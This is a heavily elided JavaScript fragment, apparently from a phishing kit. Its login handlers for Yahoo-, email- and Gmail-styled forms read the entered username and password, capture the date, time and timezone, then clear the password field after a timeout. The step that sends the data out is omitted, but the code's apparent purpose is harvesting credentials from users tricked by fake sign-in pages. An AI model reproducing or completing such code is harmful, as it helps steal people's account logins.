...
function yhlog() {
  ...
  if (email !== '' && password !== '') {
    ...
    setTimeout(function() {
      ...
      document.getElementById('yh-pass').value = '';
...
function emlog() {
  ...
  var username = document.getElementById('em-uname').value;
...
function gmlog() {
  ...
  var email = document.getElementById('gm-uname').value;
  var password = document.getElementById('gm-pass').value;
  var currentDate = new Date().toISOString().slice(0, 10);
  var currentTime = new Date().toISOString().slice(11, 19);
  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  ...
  if (email !== '' && password !== '') {
    ...
    setTimeout(function() {
      ...
      document.getElementById('gm-pass').value = '';
